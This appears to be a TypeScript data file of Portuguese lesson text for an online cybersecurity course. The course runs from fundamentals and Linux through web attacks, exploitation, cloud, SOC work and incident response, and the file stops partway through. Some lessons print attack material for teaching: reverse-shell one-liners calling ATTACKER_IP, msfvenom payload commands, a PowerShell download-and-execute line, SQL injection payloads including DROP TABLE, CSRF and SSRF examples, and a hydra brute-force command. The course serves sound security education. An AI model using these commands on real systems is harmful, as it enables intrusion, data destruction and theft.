export interface CyberModule {
  id: string;
  number: number;
  title: string;
  description: string;
  track: "common" | "offensive" | "defensive";
  lessons: CyberLesson[];
  labTitle: string;
  labDescription: string;
}

export interface CyberLesson {
  title: string;
  content: string;
}

export const modules: CyberModule[] = [
  {
    id: "mod-1",
    number: 1,
    title: "Fundamentos de Segurança Cibernética",
    description: "Princípios de segurança, carreiras, hacking ético e divulgação responsável.",
    track: "common",
    labTitle: "Simulador de Divulgação Responsável",
    labDescription: "Pratique o processo de relatar uma vulnerabilidade de forma ética e responsável.",
    lessons: [
      {
        title: "Princípios de Segurança da Informação",
        content: "A segurança da informação é fundamentada na tríade CIA: **Confidencialidade** (garantir que apenas pessoas autorizadas acessem dados), **Integridade** (assegurar que dados não sejam alterados indevidamente) e **Disponibilidade** (manter sistemas acessíveis quando necessário).\n\nAlém da tríade CIA, existem princípios complementares como **Autenticidade** (verificar a identidade de usuários e sistemas), **Não-repúdio** (impossibilidade de negar ações realizadas) e **Responsabilização** (rastrear ações até seus autores).\n\nEstes princípios guiam todas as decisões de segurança, desde a configuração de firewalls até políticas de senha.",
      },
      {
        title: "Carreiras em Cibersegurança",
        content: "O mercado de cibersegurança oferece diversas carreiras:\n\n**Offensive Security (Red Team):** Penetration testers, bug bounty hunters, pesquisadores de vulnerabilidades. Focam em encontrar falhas antes que atacantes as explorem.\n\n**Defensive Security (Blue Team):** Analistas SOC, incident responders, engenheiros de segurança. Protegem infraestruturas e respondem a incidentes.\n\n**Purple Team:** Combinam habilidades ofensivas e defensivas para melhorar a postura de segurança.\n\n**GRC:** Governança, Risco e Compliance. Focam em políticas, normas e regulamentações.\n\n**Forense Digital:** Investigam crimes cibernéticos e coletam evidências digitais.",
      },
      {
        title: "Hacking Ético e Legislação",
        content: "Hacking ético é a prática de testar sistemas de segurança com autorização explícita. A diferença entre um hacker ético e um criminoso é a **autorização**.\n\nRegras fundamentais:\n- Sempre obtenha autorização por escrito antes de testar\n- Defina escopo claro do que pode ser testado\n- Documente todas as descobertas\n- Reporte vulnerabilidades de forma responsável\n- Nunca destrua ou altere dados\n\nNo Brasil, a Lei 12.737/2012 (Lei Carolina Dieckmann) tipifica crimes informáticos. O Marco Civil da Internet (Lei 12.965/2014) estabelece princípios para uso da internet.",
      },
      {
        title: "Divulgação Responsável",
        content: "A divulgação responsável é o processo de comunicar vulnerabilidades ao fornecedor de forma ética:\n\n1. **Descoberta:** Identifique a vulnerabilidade\n2. **Documentação:** Registre detalhes técnicos, impacto e prova de conceito\n3. **Notificação:** Contate o fornecedor de forma privada\n4. **Prazo:** Dê tempo razoável para correção (geralmente 90 dias)\n5. **Publicação:** Divulgue publicamente após correção\n\nPlataformas como HackerOne e Bugcrowd facilitam este processo. Muitas empresas possuem programas de bug bounty que recompensam pesquisadores.",
      },
      {
        title: "Git e GitHub para Segurança",
        content: "Git é essencial para profissionais de segurança:\n\n**Versionamento de scripts:** Mantenha seus scripts de automação organizados e versionados.\n\n**Colaboração:** Contribua para ferramentas open-source de segurança.\n\n**Comandos essenciais:**\n```\ngit init          # Inicializar repositório\ngit add .         # Adicionar arquivos\ngit commit -m ''  # Salvar alterações\ngit push          # Enviar para remoto\ngit pull          # Baixar atualizações\ngit branch        # Gerenciar branches\n```\n\n**Segurança no Git:** Nunca faça commit de senhas, tokens ou chaves de API. Use `.gitignore` e ferramentas como `git-secrets` para prevenir vazamentos.",
      },
    ],
  },
  {
    id: "mod-2",
    number: 2,
    title: "Sistemas Operacionais e Shell",
    description: "Fundamentos de Linux e Windows, hierarquia de arquivos, permissões e navegação CLI.",
    track: "common",
    labTitle: "Terminal Trainer Interativo",
    labDescription: "Pratique comandos essenciais do Linux em um terminal simulado.",
    lessons: [
      {
        title: "Fundamentos do Linux",
        content: "O Linux é o sistema operacional dominante em servidores e cibersegurança. Distribuições populares para segurança incluem **Kali Linux**, **Parrot Security** e **BlackArch**.\n\n**Hierarquia de diretórios:**\n- `/` — Raiz do sistema\n- `/home` — Diretórios dos usuários\n- `/etc` — Arquivos de configuração\n- `/var` — Dados variáveis (logs, cache)\n- `/tmp` — Arquivos temporários\n- `/bin`, `/usr/bin` — Executáveis\n- `/proc` — Informações de processos\n\nEntender a estrutura do filesystem é fundamental para navegação, investigação forense e exploração de sistemas.",
      },
      {
        title: "Permissões e Propriedade",
        content: "O modelo de permissões do Linux usa três níveis: **proprietário (owner)**, **grupo (group)** e **outros (others)**. Cada nível tem permissões de **leitura (r=4)**, **escrita (w=2)** e **execução (x=1)**.\n\n```\nchmod 755 arquivo   # rwxr-xr-x\nchmod 644 arquivo   # rw-r--r--\nchown user:grupo arquivo\n```\n\n**SUID/SGID:** Bits especiais que permitem executar programas com privilégios do proprietário. Binários SUID são alvos comuns para escalação de privilégios.\n\n```\nfind / -perm -4000 2>/dev/null  # Encontrar binários SUID\n```",
      },
      {
        title: "Navegação e Comandos Essenciais",
        content: "Comandos fundamentais para o dia-a-dia:\n\n**Navegação:** `ls`, `cd`, `pwd`, `find`, `locate`\n**Manipulação:** `cp`, `mv`, `rm`, `mkdir`, `touch`\n**Visualização:** `cat`, `less`, `head`, `tail`, `grep`\n**Processos:** `ps aux`, `top`, `htop`, `kill`\n**Rede:** `ifconfig`, `ip addr`, `netstat`, `ss`\n**Disco:** `df -h`, `du -sh`, `mount`\n\n**Pipes e redirecionamento** são poderosos:\n```\ncat /var/log/auth.log | grep 'Failed' | wc -l\nfind / -name '*.conf' 2>/dev/null > configs.txt\n```",
      },
      {
        title: "Fundamentos do Windows",
        content: "O Windows domina ambientes corporativos. Conceitos-chave para segurança:\n\n**Active Directory (AD):** Serviço de diretório central. Alvos comuns incluem Domain Controllers, Group Policies e NTLM hashes.\n\n**Registry:** Base de dados hierárquica de configurações. Chaves importantes:\n- `HKLM\\SOFTWARE` — Software instalado\n- `HKLM\\SYSTEM` — Configurações do sistema\n- `HKU` — Perfis de usuário\n\n**PowerShell:** Ferramenta poderosa para administração e também para atacantes:\n```powershell\nGet-Process\nGet-Service\nGet-EventLog -LogName Security\n```",
      },
      {
        title: "Logs e Monitoramento",
        content: "Logs são a principal fonte de evidência em investigações:\n\n**Linux:**\n- `/var/log/auth.log` — Autenticação\n- `/var/log/syslog` — Sistema geral\n- `/var/log/apache2/` — Servidor web\n- `journalctl` — Logs do systemd\n\n**Windows:**\n- Event Viewer → Security, System, Application\n- IDs importantes: 4624 (login), 4625 (falha), 4720 (criação de conta)\n\n**Análise de logs:**\n```\ntail -f /var/log/auth.log | grep -i 'failed'\nawk '{print $1}' access.log | sort | uniq -c | sort -rn\n```",
      },
    ],
  },
  {
    id: "mod-3",
    number: 3,
    title: "Redes e Fundamentos de Segurança",
    description: "TCP/IP, DNS, roteamento, portas, firewalls e superfície de ataque.",
    track: "common",
    labTitle: "Scanner de Rede Simulado",
    labDescription: "Simule a descoberta de portas abertas e fingerprinting de serviços em uma rede alvo.",
    lessons: [
      { title: "Modelo TCP/IP e OSI", content: "O modelo TCP/IP organiza a comunicação em rede em 4 camadas: **Aplicação** (HTTP, DNS, FTP), **Transporte** (TCP, UDP), **Internet** (IP, ICMP) e **Acesso à Rede** (Ethernet, Wi-Fi).\n\nO TCP usa o handshake de 3 vias (SYN → SYN-ACK → ACK) para estabelecer conexões confiáveis. O UDP é sem conexão, mais rápido porém sem garantia de entrega.\n\nEntender esses protocolos é crucial para análise de tráfego, detecção de ataques e configuração de firewalls." },
      { title: "DNS e Resolução de Nomes", content: "O DNS traduz nomes de domínio em endereços IP. O processo de resolução passa por: cache local → servidor recursivo → root server → TLD server → servidor autoritativo.\n\n**Registros importantes:**\n- A/AAAA — Endereço IPv4/IPv6\n- MX — Servidor de email\n- NS — Nameservers\n- TXT — Texto (SPF, DKIM)\n- CNAME — Alias\n\n**Ataques DNS:** DNS spoofing, DNS tunneling, zone transfer (AXFR), subdomain takeover." },
      { title: "Portas e Serviços", content: "Portas identificam serviços em um host. Portas comuns:\n- 21 (FTP), 22 (SSH), 23 (Telnet)\n- 25 (SMTP), 53 (DNS), 80 (HTTP)\n- 443 (HTTPS), 445 (SMB), 3389 (RDP)\n- 3306 (MySQL), 5432 (PostgreSQL)\n\n**Scanning de portas** com nmap é fundamental:\n```\nnmap -sV -sC target.com\nnmap -p- --min-rate 5000 target.com\n```" },
      { title: "Firewalls e Filtragem", content: "Firewalls controlam tráfego baseado em regras. Tipos:\n\n**Packet filter:** Analisa cabeçalhos (IP, porta, protocolo)\n**Stateful:** Rastreia estado das conexões\n**Application-level (WAF):** Inspeciona conteúdo da camada de aplicação\n\nFerramentas Linux: `iptables`, `nftables`, `ufw`\n```\nufw allow 22/tcp\nufw deny 23/tcp\nufw enable\n```" },
      { title: "Superfície de Ataque", content: "A superfície de ataque é o conjunto de pontos onde um atacante pode tentar comprometer um sistema. Inclui:\n\n- Portas e serviços expostos\n- Aplicações web e APIs\n- Endpoints de autenticação\n- Interfaces de administração\n- Componentes de terceiros\n\n**Redução da superfície:** Desabilite serviços desnecessários, aplique patches, use segmentação de rede e princípio do menor privilégio." },
    ],
  },
  {
    id: "mod-4",
    number: 4,
    title: "Scripting e Automação de Enumeração",
    description: "Bash, PowerShell, Python e automação de pipelines de reconhecimento.",
    track: "common",
    labTitle: "Pipeline de Reconhecimento Automatizado",
    labDescription: "Visualize e execute um pipeline subfinder → httpx → nmap → nikto.",
    lessons: [
      { title: "Bash Scripting para Segurança", content: "Bash é a linguagem de automação padrão em Linux. Scripts essenciais para segurança:\n\n```bash\n#!/bin/bash\n# Scanner de portas simples\nfor port in $(seq 1 1000); do\n  (echo >/dev/tcp/$1/$port) 2>/dev/null && echo \"Porta $port aberta\"\ndone\n```\n\nConceitos importantes: variáveis, loops, condicionais, funções, pipes e redirecionamento." },
      { title: "Python para Automação", content: "Python é a linguagem mais usada em cibersegurança por sua versatilidade:\n\n```python\nimport requests\nimport socket\n\n# Verificar headers de segurança\ndef check_headers(url):\n    r = requests.get(url)\n    security_headers = ['X-Frame-Options', 'X-XSS-Protection',\n                        'Content-Security-Policy', 'Strict-Transport-Security']\n    for h in security_headers:\n        status = '✓' if h in r.headers else '✗'\n        print(f'{status} {h}')\n```\n\nBibliotecas populares: `requests`, `scapy`, `pwntools`, `impacket`, `BeautifulSoup`." },
      { title: "PowerShell para Red Team", content: "PowerShell é poderoso para operações em Windows:\n\n```powershell\n# Enumerar usuários do AD\nGet-ADUser -Filter * | Select Name, Enabled\n\n# Verificar portas abertas\nTest-NetConnection -ComputerName target -Port 445\n\n# Download e execução em memória\nIEX (New-Object Net.WebClient).DownloadString('http://...')\n```\n\nFerramentas como PowerSploit e Empire utilizam PowerShell extensivamente." },
      { title: "Pipelines de Enumeração", content: "Automatizar reconhecimento com pipelines é essencial:\n\n```bash\n# Pipeline completo de recon\nsubfinder -d target.com -silent | \\\n  httpx -silent | \\\n  tee alive.txt | \\\n  nuclei -t cves/\n\n# Descoberta de subdomínios + portas\nsubfinder -d target.com | \\\n  httpx -ports 80,443,8080,8443 | \\\n  nmap -iL - -sV\n```\n\nCada ferramenta alimenta a próxima, criando um fluxo eficiente de coleta de informações." },
      { title: "Ferramentas de Automação", content: "Ferramentas modernas de automação:\n\n**subfinder:** Enumeração passiva de subdomínios\n**amass:** OSINT e mapeamento de superfície de ataque\n**httpx:** Verificação de hosts HTTP ativos\n**nuclei:** Scanner de vulnerabilidades baseado em templates\n**ffuf:** Fuzzing web rápido\n\nO segredo é combinar essas ferramentas em scripts reproduzíveis que padronizem seu processo de teste." },
    ],
  },
  {
    id: "mod-5",
    number: 5,
    title: "Reconhecimento e OSINT",
    description: "Reconhecimento passivo e ativo, Google dorks, metadados e subdomínios.",
    track: "offensive",
    labTitle: "Cenário de Reconhecimento de Alvo",
    labDescription: "Escolha técnicas de recon interativamente para investigar um domínio alvo.",
    lessons: [
      { title: "Reconhecimento Passivo", content: "Coleta de informações sem interagir diretamente com o alvo:\n\n**WHOIS:** Informações de registro de domínio\n**DNS passivo:** Histórico de resoluções DNS\n**Shodan/Censys:** Dispositivos expostos na internet\n**Google Dorks:** Buscas avançadas no Google\n**Redes sociais:** LinkedIn, GitHub (vazamento de código)\n**Wayback Machine:** Versões antigas de sites\n\nO recon passivo é legal pois usa informações públicas." },
      { title: "Reconhecimento Ativo", content: "Interação direta com o alvo (requer autorização):\n\n```bash\n# Scanning de portas\nnmap -sV -sC -A target.com\n\n# Enumeração de diretórios\ngobuster dir -u http://target.com -w wordlist.txt\n\n# Banner grabbing\nnc -nv target.com 80\ncurl -I http://target.com\n```\n\nRecon ativo gera tráfego detectável pelo alvo e pode configurar acesso não autorizado sem permissão." },
      { title: "Google Dorks Avançados", content: "Google dorks são consultas avançadas para encontrar informações sensíveis:\n\n```\nsite:target.com filetype:pdf\nsite:target.com inurl:admin\nsite:target.com intitle:\"index of\"\nsite:target.com ext:sql | ext:db | ext:log\ninurl:\"wp-config.php\" \"DB_PASSWORD\"\n```\n\nBases de dados como **Google Hacking Database (GHDB)** catalogam milhares de dorks úteis para pentesters." },
      { title: "Extração de Metadados", content: "Arquivos contêm metadados reveladores:\n\n**ExifTool:** Extrai metadados de imagens, PDFs, documentos\n```bash\nexiftool documento.pdf\nexiftool -a -G imagem.jpg\n```\n\nMetadados podem revelar: nomes de usuários, software utilizado, caminhos internos, coordenadas GPS, datas de criação e modificação.\n\n**FOCA** é uma ferramenta especializada em extração massiva de metadados de domínios." },
      { title: "Descoberta de Subdomínios", content: "Subdomínios frequentemente hospedam serviços menos protegidos:\n\n```bash\n# Enumeração passiva\nsubfinder -d target.com\namass enum -passive -d target.com\n\n# Brute force\ngobuster dns -d target.com -w subdomains.txt\n\n# Certificate Transparency\ncurl 'https://crt.sh/?q=%.target.com&output=json' | jq '.[] | .name_value'\n```\n\n**Subdomain takeover:** Quando um subdomínio aponta para um serviço não mais em uso, atacantes podem assumir o controle." },
    ],
  },
  {
    id: "mod-6",
    number: 6,
    title: "Ataques Web (OWASP Top 10)",
    description: "XSS, SQL Injection, CSRF, SSRF, IDOR e bypass de autenticação.",
    track: "offensive",
    labTitle: "Laboratório de Vulnerabilidades Web",
    labDescription: "Simule ataques XSS refletido e teste payloads de SQL injection.",
    lessons: [
      { title: "Cross-Site Scripting (XSS)", content: "XSS permite injetar scripts maliciosos em páginas web:\n\n**Reflected XSS:** Payload na URL, executado quando a vítima clica\n```\nhttps://site.com/search?q=<script>alert('XSS')</script>\n```\n\n**Stored XSS:** Payload armazenado no servidor (comentários, perfis)\n\n**DOM-based XSS:** Manipulação do DOM no cliente\n\n**Prevenção:** Sanitização de input, Content-Security-Policy, encoding de output, uso de frameworks modernos que escapam HTML automaticamente." },
      { title: "SQL Injection", content: "SQLi permite manipular consultas ao banco de dados:\n\n```sql\n' OR 1=1 --          -- Bypass de autenticação\n' UNION SELECT 1,2,3 -- -- Extrair dados\n'; DROP TABLE users -- -- Destruir dados\n```\n\n**Tipos:** In-band (Union, Error-based), Blind (Boolean, Time-based), Out-of-band\n\n**Ferramentas:** sqlmap automatiza detecção e exploração:\n```bash\nsqlmap -u 'http://site.com/page?id=1' --dbs\n```\n\n**Prevenção:** Prepared statements, ORM, input validation, least privilege no banco." },
      { title: "CSRF e SSRF", content: "**CSRF (Cross-Site Request Forgery):** Faz o navegador da vítima executar ações não intencionadas em sites autenticados.\n\nExemplo: Imagem que transfere dinheiro:\n```html\n<img src=\"https://banco.com/transferir?para=atacante&valor=1000\">\n```\n\n**SSRF (Server-Side Request Forgery):** Faz o servidor realizar requisições a recursos internos:\n```\nhttps://site.com/fetch?url=http://169.254.169.254/metadata\n```\n\n**Prevenção CSRF:** Tokens anti-CSRF, SameSite cookies\n**Prevenção SSRF:** Whitelist de URLs, bloqueio de IPs internos" },
      { title: "IDOR e Controle de Acesso", content: "**IDOR (Insecure Direct Object Reference):** Acesso a recursos alterando identificadores:\n\n```\nGET /api/users/123/profile  → seus dados\nGET /api/users/124/profile  → dados de outro usuário!\n```\n\n**Broken Access Control** é o #1 do OWASP Top 10 2021.\n\nTestes:\n- Altere IDs em URLs e requisições\n- Teste endpoints com diferentes níveis de privilégio\n- Verifique se usuários comuns acessam funções admin\n\n**Prevenção:** Verificação de autorização server-side em cada requisição, UUIDs ao invés de IDs sequenciais." },
      { title: "Bypass de Autenticação", content: "Técnicas para contornar mecanismos de login:\n\n- **Credenciais padrão:** admin/admin, root/root, test/test\n- **Brute force:** Hydra, Burp Intruder\n- **SQL injection no login:** `' OR 1=1 --`\n- **Token manipulation:** JWT fraco, session fixation\n- **Password reset flaws:** Token previsível, email não validado\n- **2FA bypass:** Race conditions, fallback codes\n\n```bash\nhydra -l admin -P rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'\n```" },
    ],
  },
  {
    id: "mod-7",
    number: 7,
    title: "Técnicas de Exploração",
    description: "Reverse shells, escalação de privilégios, buffer overflow e payloads.",
    track: "offensive",
    labTitle: "Desafio de Escalação de Privilégios",
    labDescription: "Navegue por uma árvore de decisão para escalar privilégios em um sistema Linux.",
    lessons: [
      { title: "Reverse Shells", content: "Reverse shell faz o alvo conectar de volta ao atacante:\n\n**Bash:**\n```bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n```\n\n**Python:**\n```python\nimport socket,subprocess,os\ns=socket.socket()\ns.connect(('ATTACKER_IP',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])\n```\n\n**Listener:**\n```bash\nnc -lvnp 4444\n```\n\nUpgrade de shell: `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`" },
      { title: "Escalação de Privilégios Linux", content: "Após acesso inicial, o objetivo é obter root:\n\n**Enumeração:** LinPEAS, LinEnum\n```bash\nfind / -perm -4000 2>/dev/null  # SUID\nsudo -l                          # Permissões sudo\ncrontab -l                       # Tarefas agendadas\ncat /etc/passwd                  # Usuários\n```\n\n**Vetores comuns:**\n- Binários SUID vulneráveis (GTFOBins)\n- Sudo mal configurado\n- Kernel exploits\n- Credenciais em arquivos\n- Wildcards em cron jobs\n- Capabilities\n- NFS no_root_squash" },
      { title: "Escalação de Privilégios Windows", content: "Técnicas para escalar privilégios em Windows:\n\n```cmd\nwhoami /priv           # Verificar privilégios\nnet user               # Listar usuários\nnet localgroup administrators\nsysteminfo             # Info do sistema\n```\n\n**Vetores:**\n- Serviços com permissões fracas\n- Unquoted service paths\n- AlwaysInstallElevated\n- Token impersonation (Potato attacks)\n- DLL hijacking\n- Credenciais em Registry/arquivos\n\nFerramentas: WinPEAS, PowerUp, Seatbelt" },
      { title: "Buffer Overflow Básico", content: "Buffer overflow ocorre quando dados excedem o espaço alocado na memória, sobrescrevendo dados adjacentes:\n\n**Conceitos:**\n- Stack: LIFO, contém variáveis locais e endereço de retorno\n- EIP/RIP: Instruction pointer — controlar este registrador = controlar execução\n- NOP sled: Sequência de 0x90 que \"desliza\" até o shellcode\n\n**Processo básico:**\n1. Fuzzing para encontrar crash\n2. Encontrar offset exato (pattern_create/offset)\n3. Controlar EIP\n4. Encontrar espaço para shellcode\n5. Identificar bad characters\n6. Gerar shellcode com msfvenom" },
      { title: "Payloads e Frameworks", content: "**Metasploit Framework:**\n```bash\nmsfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444\nexploit\n```\n\n**msfvenom** para gerar payloads:\n```bash\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe\n```\n\n**Cobalt Strike, Sliver, Havoc** são frameworks C2 avançados usados em Red Team engagements." },
    ],
  },
  {
    id: "mod-8",
    number: 8,
    title: "Segurança Mobile e Cloud",
    description: "Superfície de ataque mobile, misconfigurações cloud, APIs e IAM.",
    track: "offensive",
    labTitle: "Analisador de Misconfigurações Cloud",
    labDescription: "Identifique problemas de permissão em um cenário de configuração cloud simulado.",
    lessons: [
      { title: "Superfície de Ataque Mobile", content: "Aplicações mobile apresentam vetores únicos:\n\n**Android:** APK reversing com jadx/apktool, interceptação com Frida, armazenamento inseguro\n**iOS:** Binary analysis, Keychain extraction, jailbreak detection bypass\n\n**Vulnerabilidades comuns:**\n- Armazenamento de credenciais em texto claro\n- Comunicação sem SSL pinning\n- Exportação de componentes (Activities, Content Providers)\n- Hardcoded secrets no código fonte\n- Lógica de negócio no cliente" },
      { title: "Misconfigurações Cloud", content: "Erros de configuração são a principal causa de breaches em cloud:\n\n**AWS:**\n- S3 buckets públicos\n- IAM policies permissivas\n- Security groups abertos\n- Lambda functions com excesso de permissões\n\n**Azure:** Storage accounts públicos, NSGs mal configurados\n**GCP:** Firewall rules, service account keys expostas\n\nFerramentas: ScoutSuite, Prowler, CloudSploit, Pacu" },
      { title: "Segurança de APIs", content: "APIs são alvos frequentes:\n\n**OWASP API Security Top 10:**\n1. Broken Object Level Authorization\n2. Broken Authentication\n3. Excessive Data Exposure\n4. Lack of Resources & Rate Limiting\n5. Broken Function Level Authorization\n\n**Testes:**\n```bash\ncurl -H 'Authorization: Bearer TOKEN' https://api.target.com/users/1\ncurl -X PUT https://api.target.com/users/1 -d '{\"role\":\"admin\"}'\n```" },
      { title: "IAM e Políticas de Acesso", content: "IAM (Identity and Access Management) é o pilar da segurança cloud:\n\n**Princípios:**\n- Menor privilégio\n- Separação de deveres\n- Rotação de credenciais\n- MFA obrigatório\n\n**Ataques:**\n- Privilege escalation via policies permissivas\n- Cross-account access abuse\n- Assume role chains\n- Metadata service exploitation (169.254.169.254)\n\nFerramentas: enumerate-iam, Pacu, AWS CLI" },
      { title: "Containers e Kubernetes", content: "Segurança em ambientes containerizados:\n\n**Docker:**\n- Escape de container via mounted socket\n- Imagens com vulnerabilidades\n- Privileged containers\n- Secrets em variáveis de ambiente\n\n**Kubernetes:**\n- RBAC misconfiguration\n- Exposed dashboard\n- etcd sem autenticação\n- Pod security policies\n\n```bash\nkubectl auth can-i --list\nkubectl get secrets -A\n```" },
    ],
  },
  {
    id: "mod-9",
    number: 9,
    title: "Relatórios e Ética",
    description: "Estrutura de relatórios pentest, CVSS, classificação de risco e divulgação.",
    track: "offensive",
    labTitle: "Gerador de Relatório Pentest",
    labDescription: "Crie um relatório de pentest simulado com classificação de severidade.",
    lessons: [
      { title: "Estrutura de Relatório Pentest", content: "Um relatório profissional de pentest contém:\n\n1. **Sumário Executivo:** Resumo não-técnico para gestores\n2. **Escopo e Metodologia:** O que foi testado e como\n3. **Descobertas:** Vulnerabilidades encontradas\n4. **Classificação de Risco:** Severidade de cada achado\n5. **Evidências:** Screenshots, logs, payloads\n6. **Recomendações:** Como corrigir cada vulnerabilidade\n7. **Conclusão:** Postura geral de segurança\n\nCada vulnerabilidade deve ter: descrição, impacto, prova de conceito, recomendação e referências." },
      { title: "CVSS — Common Vulnerability Scoring System", content: "O CVSS é o padrão para classificar severidade de vulnerabilidades:\n\n**Base Score (0-10):**\n- Attack Vector: Network/Adjacent/Local/Physical\n- Attack Complexity: Low/High\n- Privileges Required: None/Low/High\n- User Interaction: None/Required\n- Scope: Changed/Unchanged\n- Impact: Confidentiality/Integrity/Availability\n\n**Classificação:**\n- 0.0: Nenhum\n- 0.1-3.9: Baixo\n- 4.0-6.9: Médio\n- 7.0-8.9: Alto\n- 9.0-10.0: Crítico" },
      { title: "Classificação de Risco", content: "Risco = Probabilidade × Impacto\n\n**Impacto:**\n- Perda de dados confidenciais\n- Comprometimento de sistemas\n- Dano financeiro\n- Dano reputacional\n- Violação regulatória\n\n**Probabilidade:**\n- Facilidade de exploração\n- Exposição do ativo\n- Motivação do atacante\n- Existência de exploits públicos\n\n**Matriz de risco:** Combine probabilidade e impacto em uma matriz 5×5 para priorizar remediação." },
      { title: "Divulgação Responsável", content: "O processo ético de reportar vulnerabilidades:\n\n1. Verificar se existe programa de bug bounty\n2. Contatar security@empresa.com\n3. Fornecer detalhes técnicos suficientes\n4. Não divulgar publicamente antes da correção\n5. Prazo padrão: 90 dias (Google Project Zero)\n\n**Plataformas:** HackerOne, Bugcrowd, Intigriti\n\n**Recompensas:** Variam de $50 a $1M+ dependendo da severidade e do programa." },
      { title: "Ética Profissional", content: "Princípios éticos para profissionais de segurança:\n\n- Sempre obtenha autorização formal\n- Minimize danos durante testes\n- Proteja dados sensíveis encontrados\n- Reporte todas as descobertas\n- Não utilize acesso para benefício pessoal\n- Mantenha confidencialidade do cliente\n- Siga o escopo definido\n- Documente todas as ações\n\nCertificações como CEH, OSCP e PNPT incluem código de ética profissional." },
    ],
  },
  {
    id: "mod-10",
    number: 10,
    title: "Operações de Segurança (SOC)",
    description: "Workflow SOC, SIEM, análise de logs, triage de alertas.",
    track: "defensive",
    labTitle: "Investigação de Alerta SIEM",
    labDescription: "Investigue um alerta SIEM simulado e determine se é um verdadeiro positivo.",
    lessons: [
      { title: "Estrutura de um SOC", content: "O Security Operations Center (SOC) é o centro nervoso da defesa:\n\n**Níveis:**\n- **Tier 1 (Triage):** Monitoramento inicial, análise básica de alertas\n- **Tier 2 (Investigação):** Análise aprofundada, correlação de eventos\n- **Tier 3 (Threat Hunting):** Busca proativa por ameaças\n\n**Ferramentas principais:** SIEM, EDR, SOAR, Threat Intelligence, Ticketing\n\n**Métricas:** MTTD (Mean Time to Detect), MTTR (Mean Time to Respond)" },
      { title: "SIEM — Gerenciamento de Eventos", content: "SIEM centraliza logs e correlaciona eventos de segurança:\n\n**Plataformas populares:** Splunk, QRadar, Elastic SIEM, Microsoft Sentinel, Wazuh\n\n**Funcionalidades:**\n- Coleta e normalização de logs\n- Correlação de eventos\n- Alertas baseados em regras\n- Dashboards de monitoramento\n- Retenção e busca de logs\n\n**Query exemplo (Splunk):**\n```\nindex=firewall action=blocked | stats count by src_ip | sort -count\n```" },
      { title: "Análise de Logs", content: "Logs são a matéria-prima do SOC:\n\n**Fontes importantes:**\n- Firewall (conexões bloqueadas/permitidas)\n- IDS/IPS (alertas de intrusão)\n- Proxy web (URLs acessadas)\n- Active Directory (autenticação)\n- Endpoint (processos, arquivos)\n\n**Indicadores de comprometimento (IOCs):**\n- IPs maliciosos\n- Hashes de malware\n- Domínios de C2\n- Padrões de tráfego anômalos\n- Horários incomuns de acesso" },
      { title: "Triage de Alertas", content: "Processo de análise inicial de alertas:\n\n1. **Receber alerta** do SIEM\n2. **Contextualizar:** Quem? O quê? Quando? Onde?\n3. **Verificar IOCs** em threat intelligence\n4. **Analisar logs** relacionados\n5. **Classificar:** Verdadeiro positivo, falso positivo ou benigno\n6. **Escalar** se necessário (Tier 2/3)\n7. **Documentar** decisão e evidências\n\n**Dica:** 80% dos alertas são falsos positivos. A habilidade está em identificar os 20% reais." },
      { title: "Threat Intelligence", content: "Inteligência de ameaças informa decisões de segurança:\n\n**Tipos:**\n- **Tática:** IOCs, regras de detecção\n- **Operacional:** TTPs de grupos APT\n- **Estratégica:** Tendências e riscos de alto nível\n\n**Frameworks:** MITRE ATT&CK, Kill Chain, Diamond Model\n\n**Fontes:** MISP, AlienVault OTX, VirusTotal, Shodan, abuse.ch\n\nO **MITRE ATT&CK** cataloga táticas e técnicas de adversários, sendo referência fundamental para detecção e resposta." },
    ],
  },
  {
    id: "mod-11",
    number: 11,
    title: "Resposta a Incidentes",
    description: "Ciclo de vida de incidentes, contenção, erradicação e recuperação.",
    track: "defensive",
    labTitle: "Laboratório de Resposta a Incidentes",
    labDescription: "Navegue por uma árvore de decisão de resposta a um incidente de ransomware.",
    lessons: [
      { title: "Ciclo de Vida de Incidentes", content: "O NIST define 4 fases de resposta a incidentes:\n\n1. **Preparação:** Planos, equipe, ferramentas, treinamento\n2. **Detecção e Análise:** Identificar e validar incidente\n3. **Contenção, Erradicação e Recuperação:** Limitar dano, remover ameaça, restaurar\n4. **Pós-Incidente:** Lições aprendidas, melhorias\n\nUm plano de resposta a incidentes deve ser testado regularmente com tabletop exercises e simulações." },
      { title: "Contenção", content: "Limitar o impacto do incidente rapidamente:\n\n**Contenção de curto prazo:**\n- Isolar sistemas comprometidos da rede\n- Bloquear IPs/domínios maliciosos\n- Desabilitar contas comprometidas\n- Preservar evidências (não desligar máquinas)\n\n**Contenção de longo prazo:**\n- Aplicar patches\n- Alterar credenciais\n- Reforçar regras de firewall\n- Implementar monitoramento adicional\n\n**Importante:** Documentar cada ação tomada com timestamp." },
      { title: "Erradicação e Recuperação", content: "**Erradicação:**\n- Remover malware de todos os sistemas\n- Fechar vetores de acesso\n- Eliminar backdoors\n- Limpar persistência (registry, cron, services)\n\n**Recuperação:**\n- Restaurar sistemas a partir de backups limpos\n- Reconstruir sistemas comprometidos\n- Validar integridade dos dados\n- Monitoramento intensificado por semanas\n- Retorno gradual à operação normal\n\nNunca confie em um sistema comprometido — reconstrua do zero quando possível." },
      { title: "Forense Digital Básica", content: "Preservar e analisar evidências:\n\n**Princípios:**\n- Cadeia de custódia\n- Integridade de evidências (hashes)\n- Documentação detalhada\n\n**Coleta:**\n```bash\ndd if=/dev/sda of=image.dd bs=4M\nsha256sum image.dd > hash.txt\nvolatility -f memory.dmp imageinfo\n```\n\n**Análise:**\n- Timeline de eventos\n- Artefatos de filesystem\n- Análise de memória\n- Network forensics\n- Log correlation" },
      { title: "Lições Aprendidas", content: "Pós-incidente é crucial para melhoria:\n\n**Reunião pós-mortem:**\n- O que aconteceu?\n- Quando foi detectado?\n- Como respondemos?\n- O que funcionou bem?\n- O que pode melhorar?\n\n**Produtos:**\n- Relatório de incidente detalhado\n- Atualizações no plano de IR\n- Novas regras de detecção\n- Treinamento adicional\n- Melhorias em processos e ferramentas\n\nCada incidente é uma oportunidade de fortalecer a postura de segurança." },
